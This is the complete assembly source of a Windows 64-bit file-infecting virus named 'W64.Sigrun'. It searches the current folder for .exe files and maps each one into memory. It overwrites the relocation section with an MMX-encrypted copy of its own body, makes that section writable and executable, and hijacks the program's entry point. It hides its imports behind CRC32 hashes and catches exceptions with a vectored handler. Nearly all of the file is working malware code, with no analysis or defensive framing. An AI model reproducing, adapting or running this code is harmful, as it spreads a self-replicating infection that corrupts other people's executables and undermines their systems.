comment ~

W64.Sigrun

- Windows 7 PE 64-bit file infector (reloc overwriter to avoid file size increase)
- encrypted using MMX/SSE instruction MASKMOVQ (several tables required :) )
- VEH to protect from exceptions and PEB to find DLL addresses
- 32-bit checksums (to optimize code size by not using API names)


~ 

extern GetTickCount:proc
extern WriteFile:proc
extern ExitProcess:proc 
extern Sleep:proc
include sigrun.inc

.code
entry64         proc                         ;/entry:entry64
        call    GetTickCount
        mov     dword ptr [s], eax
        mov     rax, V
        push    rax
        jmp     sigrun_begin

message         label   near
        push    "*"                          ;hold the door, please don't let them in!
        push    rsp
        pop     rcx
        xor     rbx, rbx
        push    rbx
        sub     rsp, 20h
        xor     r9, r9
        mov     r8, 1
        push    rcx
        pop     rdx
        mov     rcx, -0bh
        call    WriteFile
        mov     rcx, 7c2h
        call    Sleep 
        push    rbx
        pop     rcx
        call    ExitProcess

sigrun_begin    proc
        push    60h                          ;PEB
        pop     rsi
        lods    qword ptr gs:[rsi]
        mov     rcx, qword ptr [rax + PROCESS_ENVIRONMENT_BLOCK_IMAGE_BASE + 8]
        add     qword ptr [rsp], rcx
        db      48h
        db      89h
        db      25h
        dd      rip + (offset restore_rsp - offset delta_rsp) + 2
                                             ;all code must be under delta_rsp! else fails occurs
delta_rsp       label    near
        jmp     find_ntkrn

restore_rsp     label    near
        mov     rsp, "rsprsp"
        ret

;-------------------------------------------------------------------------------
;walk lists
;-------------------------------------------------------------------------------

walk_dll        label    near
        pop     r8

walk_start      label    near
        mov     eax, dword ptr [rbp + IMAGE_DOS_HEADER.e_lfanew]
        mov     ebx, dword ptr [rbp + rax + IMAGE_OHDD64_EXPORT_TABLE]
        add     rbx, rbp
        xor     edx, edx

walk_names      label    near
        mov     esi, dword ptr [rbx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     rsi, rbp
        mov     esi, dword ptr [rsi + rdx * 4]
        add     rsi, rbp
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [rsi]
        push    8
        pop     rcx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     rsi
        cmp     byte ptr [rsi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [rdi], eax
        je      l_res
        inc     edx
        cmp     dword ptr [rbx + IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     walk_names
        jmp     restore_rsp

;-------------------------------------------------------------------------------
;resolve API address
;-------------------------------------------------------------------------------

l_res           label    near
        mov     esi, dword ptr [rbx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     rsi, rbp
        movzx   esi, word ptr [rsi + rdx * 2]
        mov     eax, dword ptr [rbx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        add     rax, rbp
        mov     eax, dword ptr [rax + rsi * 4]
        add     rax, rbp
        push    rax
        scas    dword ptr [rdi]
        cmp     byte ptr [rdi], "*"
        jne     walk_start
        jmp     r8

find_ntkrn      label    near
        mov     rax, qword ptr [rax +PROCESS_ENVIRONMENT_BLOCK_LDR_DATA64 ]
        mov     rsi, qword ptr [rax + 0 + InMemoryOrderModuleList64]
        lods    qword ptr [rsi]
        mov     rbp, qword ptr [rax + 20h]
        mov     r9, rax
        call    call_wdll

;-------------------------------------------------------------------------------
;API CRC lists for ntdll.dll and kernel32.dll
;-------------------------------------------------------------------------------

        dd      0baab0208h
        dd      0fed80136h
        db      2ah                          ;1 byte terminator
                                             ;no CRC listed can begin with 2A
        dd      0553b5c78h
        dd      0b41b926ch
        dd      0b09315f4h
        dd      0c9ebd5ceh
        dd      075272948h
        dd      0a89b382fh
        dd      0391ab6afh
        db      2ah                          ;1 byte terminator
                                             ;no CRC listed can begin with 2A
        db      2eh, 65h, 78h, 65h, 0        ;executable file

;-------------------------------------------------------------------------------
;calls to retrieve API addresses
;----
;drop DLL file if not existing
;-------------------------------------------------------------------------------

call_wdll       label    near
        pop     rdi
        call    walk_dll 
        mov     rsi, r9
        scas    byte ptr [rdi]
        lods    qword ptr [rsi]
        mov     rbp, qword ptr [rax + 20h]
        call    walk_dll
        push    rdi
        pop     rcx
        push    rsp
        pop     rdi
        enter   sizeof WIN32_FIND_DATA + (sizeof IMAGE_NT_HEADERS.OptionalHeader64.AddressOfEntryPoint - 2), 0
        push    rbp
        push    rsp
        pop     rsi
        push    rsi
        pop     rdx
        sub     rsp, 28h
        call    kFindFirstFileA 
        xchg    rbp, rax
        xor     rbx, rbx

;-------------------------------------------------------------------------------
;map view
;-------------------------------------------------------------------------------

create_map      label    near
        push    rbp
        push    rbx
        push    rbx
        push    3                            ;OPEN_EXISTING
        sub     rsp, 20h
        xor     r9, r9
        xor     r8, r8
        push    3                            ;GENERIC_READ or GENERIC_WRITE
        pop     rdx
        lea     rcx, qword ptr [rsi + WIN32_FIND_DATA.cFileName]
        call    kCreateFileA
        add     rsp, 20h + (3 * 8)
        push    rax
        push    rax
        push    rbx
        push    rbx
        sub     rsp, 20h
        xor     r9, r9
        push    4                            ;PAGE_READWRITE
        pop     r8
        push    rbx
        pop     rdx
        xchg    rcx, rax
        call    kCreateFileMappingA 
        add     rsp, 30h
        push    rax
        push    rax
        push    rbx
        sub     rsp, 20h
        xor     r9, r9
        xor     r8, r8
        push    2                            ;FILE_MAP_WRITE
        pop     rdx
        xchg    rcx, rax
        call    kMapViewOfFile 
        add     rsp, 28h
        xchg    rbp, rax
        call    infect_pe64
        mov     rax, qword ptr [rcx + POINTER_CONTEXT_RECORD64]
        add     rax, 7fh
        call    varfixes
        pop     rcx
        pop     rdi
        pop     rsi
        sub     rsp, 28h
        call    ntRtlRemoveVectoredExceptionHandler
        add     rsp, 28h
        pop     rbx
        pop     rcx
        sub     rsp, 28h
        call    kUnmapViewOfFile 
        add     rsp, 30h
        pop     rcx
        sub     rsp, 28h
        call    kCloseHandle 
        add     rsp, 30h
        pop     rcx
        sub     rsp, 28h
        call    kCloseHandle 
        add     rsp, 28h
        pop     rbp
        push    rsi
        pop     rdx
        push    rbp
        pop     rcx
        call    kFindNextFileA 
        test    rax, rax
        jnz     create_map
        jmp     restore_rsp

varfixes        proc
        pop     qword ptr [rax + CONTEXT_RIP - 7fh]
        push    qword ptr [rax + CONTEXT_R12 - 7fh]

                                             ;RSP is lost
        pop     qword ptr [rax + CONTEXT_RSP - 7fh]
        or      eax, EXCEPTION_CONTINUE_EXECUTION
        ret
varfixes        endp

infect_pe64     label    near

;-------------------------------------------------------------------------------
;MZ and PE signatures
;-------------------------------------------------------------------------------

        pop     rcx
        push    rcx
        pop     rdx
        sub     rsp, 28h
        call    ntRtlAddVectoredExceptionHandler
        add     rsp, 28h
        push    rbp
        push    rbx
        push    rsi
        push    rdi
        push    rax
        mov     r12, rsp
        push    rbp
        pop     rax
        cmp     word ptr [rax], "ZM"
        jne     call_veh
        add     eax, dword ptr [rax + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [rax], "EP"
        jne     call_veh

;-------------------------------------------------------------------------------
;AMD64
;GUI or CUI mode
;----
;if the code fits in relocs then infect
;-------------------------------------------------------------------------------

        mov     bl, IMAGE_OHDD64_RELOC_TABLE
        cmp     word ptr [rax + IMAGE_NT_HEADERS.FileHeader.Machine], IMAGE_FILE_MACHINE_AMD64
        jne     call_veh
        movzx   rcx, byte ptr [rax + IMAGE_OH64_SUBSYSTEM]
        sub     cl, 2
        cmp     cl, IMAGE_SUBSYSTEM_WINDOWS_CUI - IMAGE_SUBSYSTEM_WINDOWS_GUI
        jnbe    call_veh
        movzx   rdx, word ptr [rax + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        movzx   rcx, word ptr [rax + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
        imul    rcx, rcx, sizeof IMAGE_SECTION_HEADER
        lea     rsi, qword ptr [rax + rcx + (IMAGE_NT_HEADERS.OptionalHeader64 - sizeof IMAGE_SECTION_HEADER)]
        add     rsi, rdx
        mov     rdx, qword ptr [rax + rbx]

                                             ;relocation data should be at beginning of last section
        mov     ecx, dword ptr [rsi + IMAGE_SECTION_HEADER.VirtualAddress]
        cmp     rcx, rdx
        jne     call_veh
        
;-------------------------------------------------------------------------------
;large enough to contain various tables and decryptor
;reloc dir size can be faked. sizeofimage covers virtual size required, physical
;data size is to be checked against code size
;-------------------------------------------------------------------------------

        cmp     dword ptr [rsi + IMAGE_SECTION_HEADER.SizeOfRawData], ALIGN_SIZE8
        jae     copy_decryptor

call_veh        label    near
        int     3                            ;end up crashing

copy_decryptor  label    near
        mov     edi, dword ptr [rsi + IMAGE_SECTION_HEADER.PointerToRawData]
        add     rdi, rbp
        push    rcx
        push    rax
        push    rsi
        or      dword ptr [rsi + IMAGE_SECTION_HEADER.Characteristics], IMAGE_SCN_MEM_EXECUTE + IMAGE_SCN_MEM_WRITE

varfix_rip      label    near
        db      48h
        db      8dh
        db      35h
        dd      rip - (offset varfix_rip - offset sigrun_begin) - 7
        push    rsi
        call    skip_decryptor

;-------------------------------------------------------------------------------
;always use same code
;-------------------------------------------------------------------------------

skip_tables     label    near
        pop     rdi                          ;always must be EDI the pointer to virus code
        mov     ecx, ALIGN_SIZE8

delta_size      label    near
        lea     rsi, dword ptr [rdi + rcx]   ;pointer to mask table
        lea     rbp, dword ptr [rsi + rcx]   ;pointer to original values table
        push    rdi

decrypt_loop    label    near
        movq    mm0, qword ptr [rbp]
        movq    mm1, qword ptr [rsi]
        maskmovq mm0, mm1
        scas    qword ptr [rdi]
        lods    qword ptr [rsi]
        add     rbp, 8
        sub     rcx, 8
        jnz     decrypt_loop
        pop     rdi
        push    "hh86"                       ;replaced by host entrypoint
        jmp     rdi

;-------------------------------------------------------------------------------
;insert decryptor and make tables
;-------------------------------------------------------------------------------

skip_decryptor  label     near
        mov     al, 0e8h                     ;OPCODE_CALL
        stos    byte ptr [rdi]
                                             ;multiply by number of parts (body, tables)
        mov     eax, ALIGN_SIZE8 * 3
        stos    dword ptr [rdi]
        pop     rsi
        push    rdi
        add     rdi, rax
        push    low (offset skip_decryptor - offset skip_tables)
        pop     rcx
        rep     movs byte ptr [rdi], byte ptr [rsi]
        push    rdi
        pop     rbp
        pop     rdi
        pop     rsi
        mov     eax, ALIGN_SIZE8
        lea     rdx, qword ptr [rdi + rax]   ;pointer to mask table
        lea     rbx, qword ptr [rdx + rax]   ;pointer to original value table
        push    rbp                          ;save for later use
        xchg    rbp, rax

assing_pass     label    near
        push    8
        pop     rcx

byte_onoff      label    near
        call    randbool
        cmp     rax, 1
        je      l1
        call    random 
        stos    byte ptr [rdi]
        or      al, 80h                      ;turn on MSB
        mov     byte ptr [rdx], al           ;save MASK
        inc     rdx
        lods    byte ptr [rsi]
        mov     byte ptr [rbx], al           ;save original byte
        inc     rbx
        jmp     l2
l1:     movs    byte ptr [rdi], byte ptr [rsi]
        call    random 
        and     al, 7fh
        mov     byte ptr [edx], al           ;save mask byte - no effect
        inc     rdx
        mov     byte ptr [ebx], al           ;save random original value byte
        inc     rbx
l2:     loop    byte_onoff
        sub     rbp, 8
        jnz     assing_pass
        pop     rdi
        pop     rsi
        pop     rax
        mov     qword ptr [rax + IMAGE_OHDD64_RELOC_TABLE], rcx
        pop     rcx
        xchg    dword ptr [rax + IMAGE_NT_HEADERS.OptionalHeader64.AddressOfEntryPoint], ecx
        mov     dword ptr [rdi - 6], ecx
        int     3

;-------------------------------------------------------------------------------
;masm32 lib random number generator
;-------------------------------------------------------------------------------

random          proc
        push    rcx
        push    rdx
        push    rsi
        call    skip_seed

s               label    near
        dd      "hh86"

skip_seed       label    near
        pop     rsi
        lods    dword ptr [rsi]
        test    eax, 80000000h
        jz      skip_sigbit
        add     eax, 7fffffffh

skip_sigbit     label   near
        xor     edx, edx
        mov     ecx, 127773
        div     ecx
        xchg    ecx, eax
        mov     eax, 16807
        mul     edx
        mov     edx, ecx
        xchg    ecx, eax
        mov     eax, 2836
        mul     edx
        sub     ecx, eax
        xchg    eax, ecx
        mov     dword ptr [rsi - 4], eax
        pop     rsi
        pop     rdx
        pop     rcx
        ret
random          endp

randbool        proc
        call    random 
        and     rax, 1
        ret
randbool        endp

sigrun_end      label    near
        dq      8 dup (0)
sigrun_begin    endp
entry64         endp
end